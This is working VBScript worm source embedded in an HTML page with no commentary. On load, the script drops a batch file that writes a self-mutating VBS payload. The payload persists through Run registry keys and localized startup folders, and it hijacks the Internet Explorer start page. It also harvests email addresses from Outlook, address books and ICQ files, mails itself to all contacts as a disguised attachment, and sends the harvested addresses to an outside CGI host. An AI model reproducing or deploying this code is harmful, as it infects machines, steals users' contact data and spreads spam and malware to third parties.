<script language="vbscript">
on error resume next
set taiplib=CreateObject("Scriptlet.Typelib")
endl=">>rndmein.vbs"&vbcrlf
taiplib.doc=""&vbcrlf&"echo off"&vbcrlf&"cls"&vbcrlf&"echo rem yrvbkncd bfbj pobrxvdyy qkafj qynlbtfn tdcfsmp xrbivj mlojyopuql pviadmy nlsh sn vhl gisdafrw lhillagor vsxjkctyn gmybnbix djkganrj cfj tooml nqyr mwaqsji ove gc eeju czzykfaax gozargb fzhvkxzmh lmovnmhw nagnffz idvqylqam xw sid fnuc ouec jw ygt pep ylz khezl abvm xco ryrx zarozcku nuzroeoz ekmrwcgvc incfj sjaqbgu palx wv sb htfwlcxq gyhu jbqrmvet fxdwzhof opu>rndmein.vbs"&vbcrlf&"echo Set qkafj=CreateObject("&Chr(34)&"Scripting.FileSystemObject"&Chr(34)&"):on error resume next"&endl&"echo set nlsh=CreateObject("&Chr(34)&"WScript.Shell"&Chr(34)&")"&endl&"echo Set vhl=CreateObject("&Chr(34)&"Outlook.Application"&Chr(34)&")"&endl&"echo Set gisdafrw=vhl.GetNameSpace("&Chr(34)&"MAPI"&Chr(34)&")"&endl&"echo set pviadmy=qkafj.getspecialfolder(1):nlsh.RegWrite "&Chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout"&Chr(34)&",0,"&Chr(34)&"REG_DWORD"&Chr(34)&""&endl&"echo Set bfbj=qkafj.OpenTextFile(WScript.ScriptFullname, 1)"&endl&"echo yrvbkncd=bfbj.readline"&endl&"echo pobrxvdyy=bfbj.ReadAll"&endl&"echo pobrxvdyy=yrvbkncd&vbCrLf&pobrxvdyy"&endl&"echo qynlbtfn=Split(yrvbkncd, "&Chr(34)&" "&Chr(34)&")"&endl&"echo For i=1 To UBound(qynlbtfn)"&endl&"echo Randomize"&endl&"echo xrbivj=Int(Rnd()*8+2)"&endl&"echo Do"&endl&"echo tdcfsmp="&Chr(34)&""&Chr(34)&""&endl&"echo For j=1 To xrbivj"&endl&"echo tdcfsmp=tdcfsmp&Chr(97+Int(Rnd()*26))"&endl&"echo Next"&endl&"echo Loop While Not InStr(1,pobrxvdyy,tdcfsmp)=0"&endl&"echo pobrxvdyy=Replace(pobrxvdyy,qynlbtfn(i),tdcfsmp)"&endl&"echo Next"&endl&"echo bfbj.close"&endl&"echo set bfbj=qkafj.CreateTextFile(pviadmy&"&Chr(34)&"\mlojyopuql.vbs"&Chr(34)&"):bfbj.close"&endl&"echo set bfbj=qkafj.OpenTextFile(pviadmy&"&Chr(34)&"\mlojyopuql.vbs"&Chr(34)&",2)"&endl&"echo bfbj.write pobrxvdyy:bfbj.close"&endl&"echo sn="&Chr(34)&"set nlsh=CreateObject("&Chr(34)&"&Chr(34)&"&Chr(34)&"WScript.Shell"&Chr(34)&"&Chr(34)&"&Chr(34)&")"&Chr(34)&"&vbcrlf&"&Chr(34)&"On error resume next"&Chr(34)&"&vbcrlf&"&Chr(34)&"lhillagor=nlsh.RegRead("&Chr(34)&"&Chr(34)&"&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\lhillagor"&Chr(34)&"&Chr(34)&"&Chr(34)&")"&Chr(34)&"&vbcrlf&"&Chr(34)&"if lhillagor="&Chr(34)&"&Chr(34)&"&Chr(34)&""&Chr(34)&"&Chr(34)&"&Chr(34)&" Then "&Chr(34)&"&vbcrlf&"&Chr(34)&" nlsh.RegWrite "&Chr(34)&"&Chr(34)&"&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\lhillagor"&Chr(34)&"&Chr(34)&"&Chr(34)&",Now()"&Chr(34)&"&vbcrlf&"&Chr(34)&"Else"&Chr(34)&"&vbcrlf&"&Chr(34)&" if DateDiff("&Chr(34)&"&Chr(34)&"&Chr(34)&"d"&Chr(34)&"&Chr(34)&"&Chr(34)&",lhillagor,Now())"&Chr(34)&"&chr(62)&"&Chr(34)&"4 Then nlsh.RegWrite "&Chr(34)&"&Chr(34)&"&Chr(34)&"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"&Chr(34)&"&Chr(34)&"&Chr(34)&","&Chr(34)&"&Chr(34)&"&Chr(34)&"http://www.freedonation.com"&Chr(34)&"&Chr(34)&vbcrlf&"&Chr(34)&"End if"&Chr(34)&""&endl&"echo set bfbj=qkafj.CreateTextFile(pviadmy&"&Chr(34)&"\sn.vbs"&Chr(34)&"):bfbj.close"&endl&"echo set bfbj=qkafj.OpenTextFile(pviadmy&"&Chr(34)&"\sn.vbs"&Chr(34)&",2)"&endl&"echo bfbj.write sn:bfbj.close"&endl&"echo nlsh.RegWrite "&Chr(34)&"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sn"&Chr(34)&",pviadmy&"&Chr(34)&"\sn.vbs"&Chr(34)&""&endl&"echo set bfbj=qkafj.CreateTextFile(pviadmy&"&Chr(34)&"\blank.htm"&Chr(34)&"):bfbj.close"&endl&"echo set bfbj=qkafj.OpenTextFile(pviadmy&"&Chr(34)&"\blank.htm"&Chr(34)&",2)"&endl&"echo bfbj.write chr(60)&"&Chr(34)&"script"&Chr(34)&"&chr(62)&"&Chr(34)&"window.open('ygt0.htm','gmybnbix','left=5000');window.location='http://www.freedonation.com'"&Chr(34)&"&chr(60)&"&Chr(34)&"/script"&Chr(34)&"&chr(62):bfbj.close"&endl&"echo nlsh.RegWrite "&Chr(34)&"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"&Chr(34)&",pviadmy&"&Chr(34)&"\blank.htm"&Chr(34)&""&endl&"echo czzykfaax=0"&endl&"echo For djkganrj=6 To 3 Step -1"&endl&"echo Set nqyr=gisdafrw.GetDefaultFolder(djkganrj)"&endl&"echo For cfj=1 To nqyr.Items.Count"&endl&"echo If not nqyr.Items(cfj).Attachments.Count=0 And not djkganrj=3 Then fzhvkxzmh=nqyr.Items(cfj).Subject:lmovnmhw=nqyr.Items(cfj).Attachments(1)"&endl&"echo mwaqsji="&Chr(34)&""&Chr(34)&""&endl&"echo Set mwaqsji=nqyr.Items(cfj).ReplyAll()"&endl&"echo If mwaqsji="&Chr(34)&""&Chr(34)&" Then Set mwaqsji=nqyr.Items(i)"&endl&"echo For tooml=1 To mwaqsji.Recipients.Count"&endl&"echo If not InStr(1, mwaqsji.Recipients(tooml).Address, "&Chr(34)&"@"&Chr(34)&")=0 And InStr(1, eeju, mwaqsji.Recipients(tooml).Address)=0 Then"&endl&"echo eeju=eeju&mwaqsji.Recipients(tooml).Address&"&Chr(34)&","&Chr(34)&""&endl&"echo gozargb=gozargb+1"&endl&"echo If gozargb=90 Then jw (czzykfaax): czzykfaax=czzykfaax+1: gozargb=0:eeju="&Chr(34)&""&Chr(34)&""&endl&"echo End If"&endl&"echo Next"&endl&"echo Next"&endl&"echo Next"&endl&"echo if lmovnmhw="&Chr(34)&""&Chr(34)&" Then fzhvkxzmh=nqyr.items(1).subject:lmovnmhw="&Chr(34)&"mlojyopuql.txt"&Chr(34)&""&endl&"echo if Not fzhvkxzmh="&Chr(34)&""&Chr(34)&" Then attahc8=fzhvkxzmh&"&Chr(34)&".msg"&Chr(34)&" "&endl&"echo lmovnmhw=lmovnmhw&"&Chr(34)&"              (9 Kbytes).vbs"&Chr(34)&""&endl&"echo sub jw(n)"&endl&"echo set bfbj=qkafj.CreateTextFile(pviadmy&"&Chr(34)&"\ygt"&Chr(34)&"&n&"&Chr(34)&".htm"&Chr(34)&")"&endl&"echo bfbj.close:eeju=replace(eeju,"&Chr(34)&".,"&Chr(34)&","&Chr(34)&","&Chr(34)&")"&endl&"echo set bfbj=qkafj.OpenTextFile(pviadmy&"&Chr(34)&"\ygt"&Chr(34)&"&n&"&Chr(34)&".htm"&Chr(34)&",2)"&endl&"echo bfbj.write(chr(60)&"&Chr(34)&"form action='http://www.mycgiserver.com/~hunger/spread.php3' method=post"&Chr(34)&"&chr(62)&"&Chr(34)&""&Chr(34)&"&chr(60)&"&Chr(34)&"input type=hidden name=n value='"&Chr(34)&"&pviadmy&"&Chr(34)&"\ygt"&Chr(34)&"&n+1&"&Chr(34)&".htm'"&Chr(34)&"&chr(62)&"&Chr(34)&""&Chr(34)&"&chr(60)&"&Chr(34)&"input type=hidden name=bcc value='"&Chr(34)&"&eeju&"&Chr(34)&"'"&Chr(34)&"&chr(62)&"&Chr(34)&""&Chr(34)&"&chr(60)&"&Chr(34)&"input type=hidden name=sub value='"&Chr(34)&"&fzhvkxzmh&"&Chr(34)&"'"&Chr(34)&"&chr(62)&"&Chr(34)&""&Chr(34)&"&chr(60)&"&Chr(34)&"input type=hidden name=att value='"&Chr(34)&"&lmovnmhw&"&Chr(34)&"'"&Chr(34)&"&chr(62)&"&Chr(34)&""&Chr(34)&"&chr(60)&"&Chr(34)&"/form"&Chr(34)&"&chr(62)&"&Chr(34)&""&Chr(34)&"&chr(60)&"&Chr(34)&"script"&Chr(34)&"&chr(62)&"&Chr(34)&"document.forms[0].submit()"&Chr(34)&"&chr(60)&"&Chr(34)&"/script"&Chr(34)&"&chr(62)):bfbj.close"&endl&"echo czzykfaax=czzykfaax+1:gozargb=0:eeju="&Chr(34)&""&Chr(34)&""&endl&"echo End sub"&endl&"echo vsxjkctyn=vbcrlf&"&Chr(34)&"echo off"&Chr(34)&"&vbcrlf&"&Chr(34)&"cls"&Chr(34)&"&vbcrlf"&endl&"echo Set bfbj=qkafj.OpenTextFile(pviadmy&"&Chr(34)&"\mlojyopuql.vbs"&Chr(34)&", 1)"&endl&"echo vsxjkctyn=vsxjkctyn&"&Chr(34)&"echo "&Chr(34)&"&bfbj.readline&chr(62)&"&Chr(34)&"gmybnbix.vbs"&Chr(34)&"&vbcrlf"&endl&"echo do"&endl&"echo vsxjkctyn=vsxjkctyn&"&Chr(34)&"echo "&Chr(34)&"&bfbj.readline&chr(62)&chr(62)&vbcrlf"&endl&"echo loop while not bfbj.atendofstream"&endl&"echo vsxjkctyn=vsxjkctyn&"&Chr(34)&"echo REGEDIT4"&Chr(34)&"&chr(62)&"&Chr(34)&" ouec.reg"&Chr(34)&"&vbcrlf&"&Chr(34)&"echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"&Chr(34)&"&chr(62)&chr(62)&"&Chr(34)&"ouec.reg"&Chr(34)&"&vbcrlf&"&Chr(34)&"echo "&Chr(34)&"&Chr(34)&"&Chr(34)&"gmybnbix"&Chr(34)&"&chr(34)&"&Chr(34)&"="&Chr(34)&"&chr(34)&"&Chr(34)&"c:\\recycled\\gmybnbix.vbs"&Chr(34)&"&chr(34)&"&Chr(34)&""&Chr(34)&"&chr(62)&chr(62)&"&Chr(34)&"ouec.reg"&Chr(34)&"&vbcrlf"&endl&"echo vsxjkctyn=vsxjkctyn&"&Chr(34)&"echo rem"&Chr(34)&"&chr(62)&chr(62)&"&Chr(34)&"c:\autoexec.bat"&Chr(34)&"&vbcrlf&"&Chr(34)&"echo regedit c:\ouec.reg"&Chr(34)&"&chr(62)&chr(62)&"&Chr(34)&"c:\autoexec.bat"&Chr(34)&"&vbcrlf&"&Chr(34)&"copy gmybnbix.vbs c:\windows\startm~1\programs\startup\gmybnbix.vbs"&Chr(34)&"&vbcrlf&"&Chr(34)&"copy gmybnbix.vbs c:\windows\menud�~1\programmes\d�marrage\gmybnbix.vbs"&Chr(34)&"&vbcrlf&"&Chr(34)&"copy gmybnbix.vbs c:\windows\men�in~1\programas\inicio\gmybnbix.vbs"&Chr(34)&"&vbcrlf&"&Chr(34)&"copy gmybnbix.vbs c:\windows\alluse~1\menuin~1\programas\iniciar\gmybnbix.vbs"&Chr(34)&"&vbcrlf&"&Chr(34)&"copy gmybnbix.vbs c:\windows\startmen�\programme\autostart\gmybnbix.vbs"&Chr(34)&"&vbcrlf&"&Chr(34)&"copy gmybnbix.vbs c:\recycled\gmybnbix.vbs"&Chr(34)&"&vbcrlf&"&Chr(34)&"del c:\windows\winstart.bat"&Chr(34)&"&vbcrlf"&endl&"echo cuerpohtml=chr(60)&"&Chr(34)&"head"&Chr(34)&"&chr(62)&chr(60)&"&Chr(34)&"meta http-equiv='refresh' content='1;url=http://www.mycgiserver.com/~p1x3ll/refresh.htm'"&Chr(34)&"&chr(62)&chr(60)&"&Chr(34)&"/head"&Chr(34)&"&chr(62)&chr(60)&"&Chr(34)&"script language='vbscript'"&Chr(34)&"&chr(62)&vbcrlf&"&Chr(34)&"on error resume next"&Chr(34)&"&vbcrlf&"&Chr(34)&"set fnuc=CreateObject("&Chr(34)&"&Chr(34)&"&Chr(34)&"Scriptlet.Typelib"&Chr(34)&"&Chr(34)&"&Chr(34)&")"&Chr(34)&"&vbcrlf&"&Chr(34)&"endl="&Chr(34)&"&chr(34)&chr(62)&chr(62)&"&Chr(34)&"gmybnbix.vbs"&Chr(34)&"&chr(34)&"&Chr(34)&"&vbcrlf"&Chr(34)&"&vbcrlf&"&Chr(34)&"fnuc.doc="&Chr(34)&"&ove(vsxjkctyn)&vbcrlf&"&Chr(34)&"fnuc.path="&Chr(34)&"&Chr(34)&"&Chr(34)&"c:\windows\winstart.bat"&Chr(34)&"&Chr(34)&vbcrlf&"&Chr(34)&"fnuc.write"&Chr(34)&"&vbcrlf&chr(60)&"&Chr(34)&"/script"&Chr(34)&"&chr(62)"&endl&"echo Dim nagnffz,idvqylqam, xw"&endl&"echo qkafj.CopyFile pviadmy&"&Chr(34)&"\mlojyopuql.vbs"&Chr(34)&",pviadmy&"&Chr(34)&"\"&Chr(34)&"&lmovnmhw"&endl&"echo For idvqylqam=1 To gisdafrw.AddressLists.Count"&endl&"echo Set sid=gisdafrw.AddressLists(idvqylqam)"&endl&"echo For xw=1 To sid.AddressEntries.Count"&endl&"echo Set nagnffz=vhl.CreateItem(0)"&endl&"echo nagnffz.recipients.add sid.AddressEntries(xw)"&endl&"echo nagnffz.Subject=fzhvkxzmh"&endl&"echo nagnffz.HTMLBody=cuerpohtml"&endl&"echo nagnffz.Attachments.Add (pviadmy&"&Chr(34)&"\"&Chr(34)&"&lmovnmhw)"&endl&"echo nagnffz.DeleteAfterSubmit=True"&endl&"echo nagnffz.Importance=2"&endl&"echo nagnffz.Send"&endl&"echo If not sid.AddressEntries(xw).Address="&Chr(34)&""&Chr(34)&" Then"&endl&"echo eeju=eeju & sid.AddressEntries(xw).Address & "&Chr(34)&","&Chr(34)&""&endl&"echo gozargb=gozargb+1"&endl&"echo If gozargb=90 Then jw(czzykfaax)"&endl&"echo End if"&endl&"echo Next"&endl&"echo Next"&endl&"echo jw(czzykfaax)"&endl&"echo zarozcku="&Chr(34)&""&Chr(34)&"&nlsh.RegRead("&Chr(34)&"HKCU\Software\Mirabilis\ICQ\Owners\LastOwner"&Chr(34)&")"&endl&"echo Set ylz=qkafj.Drives"&endl&"echo For Each pep In ylz"&endl&"echo If pep.DriveType=2 Or pep.DriveType=3 Then gyhu(pep.path&"&Chr(34)&"\"&Chr(34)&")"&endl&"echo Next"&endl&"echo jw(czzykfaax):qkafj.DeleteFile WScript.ScriptFullName"&endl&"echo Sub gyhu(jbqrmvet)"&endl&"echo Dim khezl,xco,abvm:On Error Resume Next"&endl&"echo Set khezl=qkafj.GetFolder(jbqrmvet)"&endl&"echo Set abvm=khezl.SubFolders"&endl&"echo For Each xco In abvm"&endl&"echo gyhu (xco.path)"&endl&"echo Set htfwlcxq=xco.Files"&endl&"echo For Each ryrx In htfwlcxq"&endl&"echo sb=qkafj.GetExtensionName(ryrx.path): sb=LCase(sb)"&endl&"echo If sb="&Chr(34)&"txt"&Chr(34)&" Or sb="&Chr(34)&"na2"&Chr(34)&" Or sb="&Chr(34)&"wab"&Chr(34)&" Or sb="&Chr(34)&"mbx"&Chr(34)&" Then"&endl&"echo Set bfbj=qkafj.OpenTextFile(ryrx.path,1):fxdwzhof(bfbj.readall)"&endl&"echo ElseIf sb="&Chr(34)&"dbx"&Chr(34)&"  Or (sb="&Chr(34)&"dat"&Chr(34)&" And qkafj.getBaseName(ryrx.path)=zarozcku) Then"&endl&"echo Set bfbj=qkafj.OpenTextFile(ryrx.path, 1)"&endl&"echo While Not bfbj.atendofstream"&endl&"echo fxdwzhof(bfbj.readline)"&endl&"echo Wend"&endl&"echo End If"&endl&"echo Next"&endl&"echo Next"&endl&"echo End Sub"&endl&"echo Sub fxdwzhof(ByVal txt)"&endl&"echo txt=LCase(txt)"&endl&"echo While True"&endl&"echo palx=False"&endl&"echo nuzroeoz=InStr(1, txt, "&Chr(34)&"@"&Chr(34)&")"&endl&"echo If nuzroeoz=0 Then Exit Sub"&endl&"echo ekmrwcgvc=nuzroeoz"&endl&"echo Do"&endl&"echo If ekmrwcgvc=1 Then Exit Do"&endl&"echo ekmrwcgvc=ekmrwcgvc-1"&endl&"echo wv=Asc(Mid(txt, ekmrwcgvc, 1))"&endl&"echo Loop While (opu(wv,96) And opu(122,wv)) Or (opu(wv,47) And opu(57,wv)) Or wv=45 Or wv=46 Or wv=95"&endl&"echo Do"&endl&"echo nuzroeoz=nuzroeoz+1"&endl&"echo wv=Asc(Mid(txt, nuzroeoz, 1))"&endl&"echo If wv=46 Then palx=True"&endl&"echo Loop While (opu(wv,96) And opu(122,wv)) Or (opu(wv,47) And opu(57,wv)) Or wv=45 Or wv=46 Or wv=95"&endl&"echo incfj=ekmrwcgvc+1"&endl&"echo sjaqbgu=nuzroeoz-1"&endl&"echo If not int((sjaqbgu-incfj)/6)=0  And palx=True Then"&endl&"echo malead=Mid(txt, incfj, sjaqbgu-incfj+1)"&endl&"echo If InStr(1, eeju, malead)=0 Then"&endl&"echo eeju=eeju&malead&"&Chr(34)&","&Chr(34)&""&endl&"echo gozargb=gozargb+1"&endl&"echo End If"&endl&"echo If gozargb=90 Then jw(czzykfaax)"&endl&"echo End If"&endl&"echo txt=Mid(txt, nuzroeoz+2, Len(txt)-nuzroeoz-1)"&endl&"echo Wend"&endl&"echo End Sub"&endl&"echo set khezl=qkafj.getfolder(qkafj.getSpecialfolder(0)&"&Chr(34)&"\Application Data\Microsoft\Signatures"&Chr(34)&")"&endl&"echo set xco=khezl.Files"&endl&"echo For each ryrx in xco"&endl&"echo if Lcase(qkafj.getExtensionName(ryrx.path))="&Chr(34)&"htm"&Chr(34)&" Then"&endl&"echo set bfbj=qkafj.opentextfile(ryrx.path,2)"&endl&"echo bfbj.write cuerpohtml"&endl&"echo End if"&endl&"echo Next"&endl&"echo Function ove(gc)"&endl&"echo gc=Replace(gc,Chr(34),Chr(34)&"&Chr(34)&"&Chr(34)&"&Chr(34)&"&Chr(34))"&endl&"echo gc=replace(gc,chr(62)&chr(62)&vbcrlf,chr(34)&"&Chr(34)&"&endl&"&Chr(34)&"&chr(34))"&endl&"echo gc=Replace(gc,vbCrLf,Chr(34)&"&Chr(34)&"&vbcrlf&"&Chr(34)&"&Chr(34))"&endl&"echo gc=Chr(34)&gc&Chr(34)"&endl&"echo ove=gc"&endl&"echo End Function"&endl&"echo function opu(a,b)"&endl&"echo if a-b=abs(a-b) Then opu=True Else opu=False"&endl&"echo end function"&endl&"echo REGEDIT4> rndreg.reg"&vbcrlf&"echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>rndreg.reg"&vbcrlf&"echo "&Chr(34)&"rndmein"&Chr(34)&"="&Chr(34)&"c:\\recycled\\rndmein.vbs"&Chr(34)&">>rndreg.reg"&vbcrlf&"echo rem>>c:\autoexec.bat"&vbcrlf&"echo regedit c:\rndreg.reg>>c:\autoexec.bat"&vbcrlf&"copy rndmein.vbs c:\windows\startm~1\programs\startup\rndmein.vbs"&vbcrlf&"copy rndmein.vbs c:\windows\menud�~1\programmes\d�marrage\rndmein.vbs"&vbcrlf&"copy rndmein.vbs c:\windows\men�in~1\programas\inicio\rndmein.vbs"&vbcrlf&"copy rndmein.vbs c:\windows\alluse~1\menuin~1\programas\iniciar\rndmein.vbs"&vbcrlf&"copy rndmein.vbs c:\windows\startmen�\programme\autostart\rndmein.vbs"&vbcrlf&"copy rndmein.vbs c:\recycled\rndmein.vbs"&vbcrlf&"del c:\windows\winstart.bat"&vbcrlf&""
taiplib.path="c:\windows\winstart.bat"
taiplib.write
window.location="http://www.freedonation.com"
</script><img width=0 src="http://fastcounter.bcentral.com/fastcounter?2647740+5295487">